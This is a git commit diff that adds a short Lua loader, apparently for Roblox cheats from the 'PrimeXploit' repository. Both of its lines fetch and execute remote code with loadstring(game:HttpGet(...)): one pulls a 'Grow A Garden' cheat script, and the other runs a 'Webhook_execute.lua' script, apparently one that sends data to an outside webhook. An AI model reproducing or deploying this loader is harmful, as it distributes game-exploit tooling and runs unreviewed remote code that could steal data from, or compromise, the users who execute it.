50e56da18aaa2da99727b4b46831d021bcf151e8
PrimeXploit <forgivetomyct@gmail.com>
2025-05-31 11:05:38 +0700

    Update and rename Main_Script.txt to Main_Script.lua

---
+++ Main_Script.lua
@@ -0,0 +1,5 @@
+_G.place = {
+    ["126884695634066"] = "loadstring(game:HttpGet('https://raw.githubusercontent.com/PrimeXploit/Lua-Script/refs/heads/main/Grow%20A%20Garden/Script.lua'))()"
+}
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PrimeXploit/Lua-Script/refs/heads/main/Webhook_execute.lua'))()
